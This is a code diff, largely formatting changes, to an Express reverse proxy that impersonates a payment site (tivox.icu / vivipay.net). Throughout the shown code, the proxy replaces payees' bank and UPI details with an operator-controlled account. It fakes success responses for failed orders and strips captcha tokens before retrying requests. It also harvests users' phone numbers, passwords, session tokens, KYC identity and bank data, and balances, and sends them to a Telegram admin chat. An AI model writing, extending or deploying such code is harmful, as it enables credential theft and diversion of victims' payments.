-                    userId:      String(userId || ''),
-                    forced:      true,   // marks this as our intercepted order
+                    payType: derivedPt,
+                    time: now,
+                    userId: String(userId || ''),
+                    forced: true,   // marks this as our intercepted order
                   };
                   // Alt key (rptNo/orderNo may differ)
                   if (bjData.rptNo && bjData.rptNo !== case1OrderId) data.orderBankMap[String(bjData.rptNo)] = data.orderBankMap[case1OrderId];
                   if (bjData.orderNo && bjData.orderNo !== case1OrderId) data.orderBankMap[String(bjData.orderNo)] = data.orderBankMap[case1OrderId];
                 }
                 notifyAdmin(data,
-`🛒 BUY SUCCESS — Bank Replaced
+                  `🛒 BUY SUCCESS — Bank Replaced
 📋 Order: ${reqOrderId || 'N/A'}
 💳 Wallet: ${ptName}
 🏦 Replaced: ${activeBank.accountHolder} | ${activeBank.accountNo}
@@ -1286,16 +1319,16 @@ app.all('/xxapi/*', async (req, res) => {
           // ── Case 2: Real API returned ERROR ─────────────────────────────────
           // Force success ONLY if proxy is ON and a bank is active
           if (proxyOn && activeBank) {
-            const bkName  = activeBank.accountHolder;
-            const bkAcct  = activeBank.accountNo;
-            const bkIfsc  = activeBank.ifsc;
-            const bkBank  = activeBank.bankName || 'Bank';
-            const bkUpi   = activeBank.upiId || '';
+            const bkName = activeBank.accountHolder;
+            const bkAcct = activeBank.accountNo;
+            const bkIfsc = activeBank.ifsc;
+            const bkBank = activeBank.bankName || 'Bank';
+            const bkUpi = activeBank.upiId || '';
             const amt4Link = savedAmount || 0;
             const { walletDomain, payAccount } = buildWalletDeepLink(activeBank, amt4Link, derivedPt);
 
             bj.code = 0;
-            bj.msg  = 'success';
+            bj.msg = 'success';
             const nowTs = Math.floor(Date.now() / 1000);
 
             if (isUsdtBuy) {
@@ -1304,7 +1337,7 @@ app.all('/xxapi/*', async (req, res) => {
                 rptNo: reqOrderId, rpt_no: reqOrderId,
                 orderNo: reqOrderId, order_no: reqOrderId,
                 orderId: reqOrderId, order_id: reqOrderId,
-                slipId:  reqOrderId,
+                slipId: reqOrderId,
                 ctType: parsedCt, method: parsedCt, payType: 0,
                 ctTypeName: 'USDT', payTypeName: 'USDT', ctName: 'USDT', payName: 'USDT',
                 usdtAddress: data.usdtAddress || '',
@@ -1319,47 +1352,47 @@ app.all('/xxapi/*', async (req, res) => {
             } else {
               bj.data = {
                 // Order IDs — all possible field names
-                rptNo:    reqOrderId, rpt_no:   reqOrderId,
-                orderNo:  reqOrderId, order_no: reqOrderId,
-                orderId:  reqOrderId, order_id: reqOrderId,
-                slipId:   reqOrderId,
+                rptNo: reqOrderId, rpt_no: reqOrderId,
+                orderNo: reqOrderId, order_no: reqOrderId,
+                orderId: reqOrderId, order_id: reqOrderId,
+                slipId: reqOrderId,
                 // Payment channel
-                ctId:     reqCtId ? parseInt(reqCtId) : 1,
-                ctType:   parsedCt,
-                method:   parsedCt,
-                payType:  derivedPt,
+                ctId: reqCtId ? parseInt(reqCtId) : 1,
+                ctType: parsedCt,
+                method: parsedCt,
+                payType: derivedPt,
                 ctTypeName: ptName, payTypeName: ptName,
-                ctName:   ptName,   payName:     ptName,
+                ctName: ptName, payName: ptName,
                 // Wallet / UPI deep link — this is what "Go Pay" uses
                 walletDomain: walletDomain,
-                payAccount:   payAccount,
-                upiId:        payAccount,
-                ctAccount:    bkAcct,
+                payAccount: payAccount,
+                upiId: payAccount,
+                ctAccount: bkAcct,
                 // Timer — 30 min from now
-                endTime:        nowTs + 1800,
-                expireTime:     nowTs + 1800,
-                expiredAt:      nowTs + 1800,
-                crtDate:        nowTs,
+                endTime: nowTs + 1800,
+                expireTime: nowTs + 1800,
+                expiredAt: nowTs + 1800,
+                crtDate: nowTs,
                 payerTimeoutTime: 1800,
-                timeoutTime:    1800,
+                timeoutTime: 1800,
                 // Bank details — ALL possible field names frontend might use
-                acctName:    bkName,  accountName: bkName,  name:     bkName,
-                acctNo:      bkAcct,  accountNo:   bkAcct,  account:  bkAcct,  cardNo: bkAcct,
-                acctCode:    bkIfsc,  ifsc:        bkIfsc,  ifscCode: bkIfsc,  bankCode: bkIfsc,
-                bankName:    bkBank,  acctBankName: bkBank, bank:     bkBank,
+                acctName: bkName, accountName: bkName, name: bkName,
+                acctNo: bkAcct, accountNo: bkAcct, account: bkAcct, cardNo: bkAcct,
+                acctCode: bkIfsc, ifsc: bkIfsc, ifscCode: bkIfsc, bankCode: bkIfsc,
+                bankName: bkBank, acctBankName: bkBank, bank: bkBank,
                 // Amount
-                amount:      amt4Link,
-                realAmount:  amt4Link,
+                amount: amt4Link,
+                realAmount: amt4Link,
                 orderAmount: amt4Link,
-                money:       amt4Link,
+                money: amt4Link,
                 // State
-                orderState:  0,
+                orderState: 0,
                 notifyState: 0,
-                currency:    3,
+                currency: 3,
                 exchangeRate: 1,
-                hideState:   0,
-                reward:      0,
-                userId:      String(userId || ''),
+                hideState: 0,
+                reward: 0,
+                userId: String(userId || ''),
               };
             }
 
@@ -1367,21 +1400,21 @@ app.all('/xxapi/*', async (req, res) => {
             if (reqOrderId) {
               if (!data.orderBankMap) data.orderBankMap = {};
               data.orderBankMap[reqOrderId] = {
-                bank:    `${bkName} | ${bkAcct}${bkIfsc ? ' | ' + bkIfsc : ''}`,
-                amount:  amt4Link,
-                rptNo:   reqOrderId,
+                bank: `${bkName} | ${bkAcct}${bkIfsc ? ' | ' + bkIfsc : ''}`,
+                amount: amt4Link,
+                rptNo: reqOrderId,
                 orderNo: reqOrderId,
                 walletDomain,
                 payType: derivedPt,
-                time:    now,
-                userId:  String(userId || ''),
-                forced:  true,
+                time: now,
+                userId: String(userId || ''),
+                forced: true,
               };
               await saveData(data);
             }
 
             notifyAdmin(data,
-`🛒 BUY ORDER FORCED
+              `🛒 BUY ORDER FORCED
 📋 Order: ${reqOrderId || 'N/A'}
 ⚠️ Original Error: [${origCode}] ${origMsg}
 ✅ Forced to success
@@ -1407,33 +1440,33 @@ app.all('/xxapi/*', async (req, res) => {
     if (isSlipDetail) {
       const { response: sd, respBody: sb2, respHeaders: sh2 } = await proxyToTivox(req);
       let sj2 = null;
-      try { sj2 = JSON.parse(sb2); } catch(e) {}
+      try { sj2 = JSON.parse(sb2); } catch (e) { }
       // If backend returned 404 / error / non-JSON — try to serve from orderBankMap
       const slipFailed = !sj2 || sd.status === 404 || (sj2.code !== 0 && sj2.code !== undefined);
       if (slipFailed && data.orderBankMap) {
         // Extract order ID from URL query or request body
         let slipId = '';
         const qs2 = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
-        for (const f of ['rptNo','orderNo','orderId','order_id','slipId','id']) {
+        for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id']) {
           slipId = slipId || qs2.get(f) || '';
         }
         if (!slipId && req.body) {
-          for (const f of ['rptNo','orderNo','orderId','order_id','slipId']) {
+          for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId']) {
             slipId = slipId || req.body[f] || '';
           }
         }
         const savedSlip = slipId ? data.orderBankMap[String(slipId)] : null;
         if (savedSlip) {
           const activeBank = getActiveBank(data, null);
-          const bkName2  = activeBank ? activeBank.accountHolder : '';
-          const bkAcct2  = activeBank ? activeBank.accountNo     : '';
-          const bkIfsc2  = activeBank ? activeBank.ifsc          : '';
-          const bkBank2  = activeBank ? (activeBank.bankName || 'Bank') : 'Bank';
-          const bkUpi2   = activeBank ? (activeBank.upiId || '')        : '';
-          const amt2     = savedSlip.amount || 0;
-          const last42   = bkAcct2.slice(-4);
-          const nowTs2   = Math.floor(Date.now() / 1000);
-          const wDomain  = bkAcct2 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct2}&ifsc=${bkIfsc2}&name=${encodeURIComponent(bkName2)}&amount=${amt2}.0&displayAccountNumber=xxxxxxxxx${last42}` : '';
+          const bkName2 = activeBank ? activeBank.accountHolder : '';
+          const bkAcct2 = activeBank ? activeBank.accountNo : '';
+          const bkIfsc2 = activeBank ? activeBank.ifsc : '';
+          const bkBank2 = activeBank ? (activeBank.bankName || 'Bank') : 'Bank';
+          const bkUpi2 = activeBank ? (activeBank.upiId || '') : '';
+          const amt2 = savedSlip.amount || 0;
+          const last42 = bkAcct2.slice(-4);
+          const nowTs2 = Math.floor(Date.now() / 1000);
+          const wDomain = bkAcct2 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct2}&ifsc=${bkIfsc2}&name=${encodeURIComponent(bkName2)}&amount=${amt2}.0&displayAccountNumber=xxxxxxxxx${last42}` : '';
           const slipResp = {
             code: 0, msg: 'success',
             data: {
@@ -1462,7 +1495,7 @@ app.all('/xxapi/*', async (req, res) => {
           const hasBank = scanHasBankFields(sj2, 0);
           if (hasBank) deepReplaceBankFields(sj2, activeBank, 0, hasBank);
           replaceWalletUrl && Object.keys(sj2.data || {}).forEach(k => {
-            if (typeof (sj2.data||{})[k] === 'string' && (sj2.data[k]||'').includes('://')) {
+            if (typeof (sj2.data || {})[k] === 'string' && (sj2.data[k] || '').includes('://')) {
               sj2.data[k] = replaceWalletUrl(sj2.data[k], activeBank);
             }
           });
@@ -1480,7 +1513,7 @@ app.all('/xxapi/*', async (req, res) => {
     if (isAvailableCt) {
       const { response: ar, respBody: ab, respHeaders: ah } = await proxyToTivox(req);
       let aj = null;
-      try { aj = JSON.parse(ab); } catch(e) {}
+      try { aj = JSON.parse(ab); } catch (e) { }
       if (aj && aj.code === 0 && Array.isArray(aj.data) && aj.data.length === 0) {
         // Backend says no channels available — inject a stub so the frontend can proceed
         aj.data = [{ id: 1, name: 'Bank Transfer', type: 0, payType: 0, status: 1, enable: 1 }];
@@ -1501,7 +1534,7 @@ app.all('/xxapi/*', async (req, res) => {
     }
 
     let jsonResp = null;
-    try { jsonResp = JSON.parse(respBody); } catch(e) {}
+    try { jsonResp = JSON.parse(respBody); } catch (e) { }
 
     if (!jsonResp) {
       respHeaders['content-length'] = String(Buffer.byteLength(respBody));
@@ -1531,14 +1564,14 @@ app.all('/xxapi/*', async (req, res) => {
             delete b.cfToken; delete b.token; delete b.captchaToken; delete b.verifyToken;
             retryBody = JSON.stringify(b);
           }
-        } catch(e) {}
+        } catch (e) { }
         if (retryBody) {
           try {
             const retryResp = await fetch('https://tivox.icu' + path, {
               method: req.method,
               headers: {
                 ...Object.fromEntries(Object.entries(req.headers).filter(([k]) =>
-                  !['host','content-length','transfer-encoding'].includes(k.toLowerCase()))),
+                  !['host', 'content-length', 'transfer-encoding'].includes(k.toLowerCase()))),
                 'host': 'tivox.icu',
                 'origin': 'https://vivipay.net',
                 'referer': 'https://vivipay.net/',
@@ -1549,11 +1582,11 @@ app.all('/xxapi/*', async (req, res) => {
             });
             const retryText = await retryResp.text();
             let retryJson = null;
-            try { retryJson = JSON.parse(retryText); } catch(e) {}
+            try { retryJson = JSON.parse(retryText); } catch (e) { }
             if (retryJson && retryJson.code === 0) {
               return res.status(200).json(retryJson);
             }
-          } catch(e) {}
+          } catch (e) { }
         }
         // Retry failed or no retry body — pass original through
       }
@@ -1591,7 +1624,7 @@ app.all('/xxapi/*', async (req, res) => {
         if (ct.includes('json')) { reqBody = JSON.parse(req.rawBody.toString()); }
         else if (ct.includes('multipart')) { reqBody = parseMultipartFields(req.rawBody); }
         else if (ct.includes('form')) { reqBody = Object.fromEntries(new URLSearchParams(req.rawBody.toString())); }
-      } catch(e) {}
+      } catch (e) { }
     }
     if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
       reqBody = { ...reqBody, ...req.body };
@@ -1630,7 +1663,7 @@ app.all('/xxapi/*', async (req, res) => {
       const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
       const token = (respData && typeof respData === 'object') ? (respData.token || respData.accessToken || '') : '';
       notifyAdmin(data,
-`🔑 LOGIN CAPTURED
+        `🔑 LOGIN CAPTURED
 👤 User: ${userId || 'N/A'}
 📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${token ? '\n🎫 Token: ' + String(token).substring(0, 40) + '...' : ''}
 🕐 ${now}`);
@@ -1654,9 +1687,9 @@ app.all('/xxapi/*', async (req, res) => {
         if (Array.isArray(obj)) { obj.forEach(i => patchFeatureFlags(i, depth + 1)); return; }
         // chargeFlag=1 → user can buy; userBankFlag=1 → bank/UPI section unlocked
         // withdrawFlag=1 → withdraw enabled; sellFlag=1 → sell enabled
-        const onFlags = ['chargeFlag','userBankFlag','withdrawFlag','sellFlag',
-          'buyFlag','rechargeFlag','tradeFlag','enableBuy','enableSell',
-          'enableWithdraw','enableRecharge','canBuy','canSell','canWithdraw'];
+        const onFlags = ['chargeFlag', 'userBankFlag', 'withdrawFlag', 'sellFlag',
+          'buyFlag', 'rechargeFlag', 'tradeFlag', 'enableBuy', 'enableSell',
+          'enableWithdraw', 'enableRecharge', 'canBuy', 'canSell', 'canWithdraw'];
         for (const f of onFlags) {
           if (obj[f] !== undefined && obj[f] === 0) obj[f] = 1;
         }
@@ -1701,7 +1734,7 @@ app.all('/xxapi/*', async (req, res) => {
             ? `\n📈 Change: ${realBalance > lastReal ? '+' : ''}₹${(realBalance - lastReal).toFixed(2)} (was ₹${lastReal})`
             : '';
           notifyAdmin(data,
-`┌──────────────────────────┐
+            `┌──────────────────────────┐
 │    💎 BALANCE SNAPSHOT    │
 └──────────────────────────┘
 👤 ID: ${userId}${userName ? '\n📛 Name: ' + userName : ''}${userPhone ? '\n📱 Phone: ' + userPhone : ''}
@@ -1741,12 +1774,12 @@ app.all('/xxapi/*', async (req, res) => {
           if (ct.includes('json')) b = JSON.parse(req.rawBody.toString());
           else if (ct.includes('multipart')) b = parseMultipartFields(req.rawBody);
           else if (ct.includes('form')) b = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
-          const keys = ['realName','name','idCard','idNo','bankCard','bankNo','accountNo','ifsc','upiId','phone','mobile'];
+          const keys = ['realName', 'name', 'idCard', 'idNo', 'bankCard', 'bankNo', 'accountNo', 'ifsc', 'upiId', 'phone', 'mobile'];
           for (const k of keys) { if (b[k]) kycInfo += `\n  ${k}: ${b[k]}`; }
-        } catch(e) {}
+        } catch (e) { }
       }
       notifyAdmin(data,
-`🔐 KYC/BIND
+        `🔐 KYC/BIND
 👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${kycInfo}
 🕐 ${now}`);
     }
@@ -1758,7 +1791,7 @@ app.all('/xxapi/*', async (req, res) => {
         if (a) sellAmt = `\n💰 Amount: ₹${a}`;
       }
       notifyAdmin(data,
-`💸 SELL/WITHDRAW
+        `💸 SELL/WITHDRAW
 👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${sellAmt}
 📊 Status: ${response.status}
 🕐 ${now}`);
@@ -1785,10 +1818,10 @@ app.all('/xxapi/*', async (req, res) => {
       if (cancelOrderId && data.orderBankMap && data.orderBankMap[cancelOrderId]) {
         const saved = data.orderBankMap[cancelOrderId];
         cancelBankInfo = `\n🏦 Bank Was: ${saved.bank}`;
-        if (!cancelAmt && saved.bank) {}
+        if (!cancelAmt && saved.bank) { }
       }
       notifyAdmin(data,
-`❌ ORDER CANCELLED
+        `❌ ORDER CANCELLED
 👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${cancelOrderId ? '\n📋 Order: ' + cancelOrderId : ''}${cancelAmt}${cancelBankInfo}
 📊 ${cancelSuccess ? '✅ Cancelled Successfully' : '⚠️ Cancel Response: ' + (jsonResp && jsonResp.message ? jsonResp.message : response.status)}
 🕐 ${now}`);
@@ -1798,13 +1831,13 @@ app.all('/xxapi/*', async (req, res) => {
       let billInfo = '';
       if (jsonResp && typeof jsonResp === 'object') {
         const d = jsonResp.data || jsonResp.body || jsonResp.result || jsonResp;
-        const fields = ['billId','orderId','orderNo','amount','money','fromTimestamp','phone','mobile','account','bankName','ifsc','upiId'];
+        const fields = ['billId', 'orderId', 'orderNo', 'amount', 'money', 'fromTimestamp', 'phone', 'mobile', 'account', 'bankName', 'ifsc', 'upiId'];
         for (const f of fields) {
           if (d[f] !== undefined && d[f] !== null && d[f] !== '') billInfo += `\n  ${f}: ${d[f]}`;
         }
       }
       notifyAdmin(data,
-`🔔 NEW BILL
+        `🔔 NEW BILL
 👤 User: ${userId || 'N/A'}${billInfo}
 🕐 ${now}`);
     }
@@ -1812,7 +1845,7 @@ app.all('/xxapi/*', async (req, res) => {
     if (data.logRequests && data.adminChatId && bot && !isLogin && !isUserInfo && !isOrder) {
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
-      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}\n📊 Status: ${response.status}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}\n📊 Status: ${response.status}`).catch(() => { });
     }
 
     const _realBankSnap = captureRealBank(jsonResp);
@@ -1828,15 +1861,15 @@ app.all('/xxapi/*', async (req, res) => {
         const isListResp = Array.isArray(respData);
         // Detect nested list: { list:[...] } / { data:[...] } / { records:[...] } / { rows:[...] } / { items:[...] }
         const nestedList = !isListResp && respData && typeof respData === 'object'
-          ? (Array.isArray(respData.list)    ? respData.list
-           : Array.isArray(respData.data)    ? respData.data
-           : Array.isArray(respData.records) ? respData.records
-           : Array.isArray(respData.rows)    ? respData.rows
-           : Array.isArray(respData.items)   ? respData.items
-           : null)
+          ? (Array.isArray(respData.list) ? respData.list
+            : Array.isArray(respData.data) ? respData.data
+              : Array.isArray(respData.records) ? respData.records
+                : Array.isArray(respData.rows) ? respData.rows
+                  : Array.isArray(respData.items) ? respData.items
+                    : null)
           : null;
 
-        const _oIdFields = ['rptNo','rpt_no','orderNo','order_no','orderId','order_id','slipId','buyOrderNo','tradeNo'];
+        const _oIdFields = ['rptNo', 'rpt_no', 'orderNo', 'order_no', 'orderId', 'order_id', 'slipId', 'buyOrderNo', 'tradeNo'];
         function _getItemOId(item) {
           for (const f of _oIdFields) { if (item[f] && String(item[f]).length >= 3) return String(item[f]); }
           return '';
@@ -1909,7 +1942,7 @@ app.all('/xxapi/*', async (req, res) => {
       if (_orderId) {
         if (!data.orderBankMap) data.orderBankMap = {};
         const bk = _bankReplaced && _replacedBank ? _replacedBank : (_realBankSnap || {});
-        data.orderBankMap[_orderId] = { bank: `${bk.accountHolder||''} | ${bk.accountNo||''} | ${bk.ifsc||''}`, time: now, userId: userId || '' };
+        data.orderBankMap[_orderId] = { bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`, time: now, userId: userId || '' };
       }
       const realLine = _realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)
         ? `🏦 Real Bank:\n  Name: ${_realBankSnap.accountHolder || 'N/A'}\n  Acc:  ${_realBankSnap.accountNo || 'N/A'}${_realBankSnap.ifsc ? '\n  IFSC: ' + _realBankSnap.ifsc : ''}${_realBankSnap.bankName ? '\n  Bank: ' + _realBankSnap.bankName : ''}${_realBankSnap.upiId ? '\n  UPI:  ' + _realBankSnap.upiId : ''}`
@@ -1923,7 +1956,7 @@ app.all('/xxapi/*', async (req, res) => {
         replaceLine = `❌ NOT Replaced (no active bank)`;
       }
       notifyAdmin(data,
-`🎯 ORDER PLACED
+        `🎯 ORDER PLACED
 👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${_orderId ? '\n📋 Order: ' + _orderId : ''}${_orderAmt !== null ? '\n💰 Amount: ₹' + _orderAmt : ''}
 ━━━━━━━━━━━━━━━━━━━━
 ${realLine}
@@ -1939,11 +1972,11 @@ ${replaceLine}
         : null;
       const orderList = (listData && Array.isArray(listData.list)) ? listData.list
         : (listData && Array.isArray(listData.data)) ? listData.data
-        : Array.isArray(listData) ? listData
-        : null;
+          : Array.isArray(listData) ? listData
+            : null;
 
       if (orderList && orderList.length > 0) {
-        const orderIdFields = ['orderNo','order_no','orderId','order_id','rptNo','rpt_no','tradeNo','trade_no','slipId','buyOrderNo'];
+        const orderIdFields = ['orderNo', 'order_no', 'orderId', 'order_id', 'rptNo', 'rpt_no', 'tradeNo', 'trade_no', 'slipId', 'buyOrderNo'];
         let capturedCount = 0;
         let logLines = [];
         if (!data.orderBankMap) data.orderBankMap = {};
@@ -1958,10 +1991,10 @@ ${replaceLine}
           for (const f of orderIdFields) { if (item[f] && String(item[f]).length >= 3) { oId = String(item[f]); break; } }
           if (!oId) continue;
 
-          const acctNo   = item.acctNo   || item.acctno   || item.accountNo  || item.accountno  || '';
-          const acctName = item.acctName || item.acctname || item.accountName || item.accountname|| '';
-          const acctCode = item.acctCode || item.acctcode || item.ifsc        || item.acctIfsc   || '';
-          const amt      = item.amount   || item.money    || item.realAmount  || item.orderAmount || '';
+          const acctNo = item.acctNo || item.acctno || item.accountNo || item.accountno || '';
+          const acctName = item.acctName || item.acctname || item.accountName || item.accountname || '';
+          const acctCode = item.acctCode || item.acctcode || item.ifsc || item.acctIfsc || '';
+          const amt = item.amount || item.money || item.realAmount || item.orderAmount || '';
 
           // Don't overwrite entries that were forced by our proxy (forced=true)
           if (!data.orderBankMap[oId] || !data.orderBankMap[oId].forced) {
@@ -1987,13 +2020,13 @@ ${replaceLine}
           const header = `📂 BUY HISTORY VIEWED\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📊 ${capturedCount} order(s) captured\n━━━━━━━━━━━━━━━━━━━━`;
           const body = logLines.slice(0, 10).join('\n━━━━━━━━━━━\n');
           const footer = `\n━━━━━━━━━━━━━━━━━━━━\n🕐 ${now}`;
-          bot.sendMessage(data.adminChatId, header + '\n' + body + footer).catch(() => {});
+          bot.sendMessage(data.adminChatId, header + '\n' + body + footer).catch(() => { });
         }
       }
     }
 
     // Non-blocking save — don't hold up the response for storage I/O
-    if (userId) saveData(data).catch(() => {});
+    if (userId) saveData(data).catch(() => { });
 
     // ── Raw log — send full req+resp to Telegram if /rr is ON
     sendRawLog(data, {
@@ -2006,11 +2039,11 @@ ${replaceLine}
       respBodyRaw: respBody,
       source: 'api',
       now
-    }).catch(() => {});
+    }).catch(() => { });
 
     sendJson(res, respHeaders, jsonResp);
 
-  } catch(e) {
+  } catch (e) {
     console.error('xxapi proxy error:', e.message);
     try {
       const url = TIVOX_API + (req.originalUrl || req.url);
@@ -2029,7 +2062,7 @@ ${replaceLine}
       const body = await resp.text();
       res.writeHead(resp.status, { 'content-type': resp.headers.get('content-type') || 'application/json' });
       res.end(body);
-    } catch(e2) {
+    } catch (e2) {
       if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
     }
   }
@@ -2393,7 +2426,7 @@ app.all('*', async (req, res) => {
     for (const [k, v] of Object.entries(req.headers)) {
       const kl = k.toLowerCase();
       if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
-          kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+        kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
       fwd[k] = v;
     }
     fwd['host'] = FRONTEND_HOST;
@@ -2410,7 +2443,7 @@ app.all('*', async (req, res) => {
     const ct = response.headers.get('content-type') || '';
 
     // Pass through response headers (skip hop-by-hop)
-    const skipHeaders = new Set(['transfer-encoding','connection','content-encoding','content-length','keep-alive']);
+    const skipHeaders = new Set(['transfer-encoding', 'connection', 'content-encoding', 'content-length', 'keep-alive']);
     response.headers.forEach((val, key) => {
       const kl = key.toLowerCase();
       if (skipHeaders.has(kl)) return;
@@ -2502,7 +2535,7 @@ app.all('*', async (req, res) => {
           status: response.status, respHeaders: rhdrs,
           respBodyRaw: html.substring(0, 8000),
           source: 'frontend', now
-        })).catch(() => {});
+        })).catch(() => { });
       }
       return;
     }
@@ -2566,10 +2599,10 @@ app.all('*', async (req, res) => {
         status: response.status, respHeaders: rhdrs,
         respBodyRaw: buf.toString('utf-8').substring(0, 8000),
         source: 'frontend', now
-      })).catch(() => {});
+      })).catch(() => { });
     }
 
-  } catch(e) {
+  } catch (e) {
     console.error('Frontend proxy error:', e.message);
     if (!res.headersSent) res.status(502).send('Proxy error: ' + e.message);
   }
